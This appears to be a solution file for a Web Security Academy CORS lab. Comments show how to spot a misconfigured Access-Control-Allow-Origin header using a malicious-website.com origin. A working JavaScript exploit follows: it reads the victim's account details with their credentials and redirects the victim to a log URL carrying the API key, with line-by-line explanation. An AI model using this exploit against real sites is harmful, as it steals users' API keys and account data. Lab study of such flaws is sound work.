/*

1) Source code reveals that the API key is fetched by an AJAX request the /accountDetails endp

2)  GET /accountDetails
    Origin: https://malicious-website.com
//send this and try
//and in response you can see 

HTTP/2 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
// so the target is vulnerable to CORS



*/
<script>
    var req = new XMLHttpRequest();

    req.onload = reqListener; 
    req.open('get','0a1200e8040a5c1886741b6c00900066.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
       location='/log?key='+this.responseText
    };
</script>
/*
The code fetches data from a URL endpoint 
and then redirects the user to a different location based on the response received from the server.

The reqListener() function will be executed once the server responds with the data.

req.open('get', 'YOUR-LAB-ID.web-security-academy.net/accountDetails', true); 
line configures the request by specifying the HTTP method (GET) and the 
URL ('YOUR-LAB-ID.web-security-academy.net/accountDetails') 
from which data should be fetched. The third argument, true, enables asynchronous mode

req.withCredentials = true; enables sending credentials (such as cookies and HTTP authentication) 
along with the request. 
This is necessary if the server requires authentication to access the requested resource

req.send(); initiates the actual HTTP request to the server.

reqListener() then reads the server's response using this.responseText 
and constructs a new URL using the location object. It then redirects the user 
to the newly constructed URL by assigning it to the location property. 
In this case, the URL includes a query parameter key with the value of the server's response data.


*/